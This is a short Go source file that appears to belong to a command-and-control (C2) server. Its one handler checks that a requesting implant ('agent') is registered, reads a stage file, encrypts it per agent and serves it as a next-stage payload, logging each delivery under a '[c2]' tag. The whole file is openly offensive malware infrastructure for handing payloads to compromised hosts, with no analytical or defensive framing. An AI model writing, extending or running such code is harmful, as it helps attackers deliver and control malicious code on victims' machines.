package main

import (
	"log"
	"net/http"
	"os"
)

// stagePath is set from the --stage flag in main.go.
var stagePath string

func handleStage(w http.ResponseWriter, r *http.Request, agentID string) {
	mu.Lock()
	agent, known := agents[agentID]
	mu.Unlock()
	if !known || len(agent.SessionKey) == 0 {
		http.Error(w, "unknown agent", http.StatusForbidden)
		return
	}

	data, err := os.ReadFile(stagePath)
	if err != nil {
		log.Printf("[c2] stage file missing: %v", err)
		http.Error(w, "stage unavailable", http.StatusInternalServerError)
		return
	}

	enc, err := encryptForAgent(agentID, string(data))
	if err != nil {
		log.Printf("[c2] stage encrypt error for %s: %v", agentID, err)
		http.Error(w, "encrypt error", http.StatusInternalServerError)
		return
	}

	log.Printf("[c2] served stage to agent %s (%d bytes)", agentID, len(data))
	w.Header().Set("Content-Type", "text/plain")
	w.Write([]byte(enc))
}
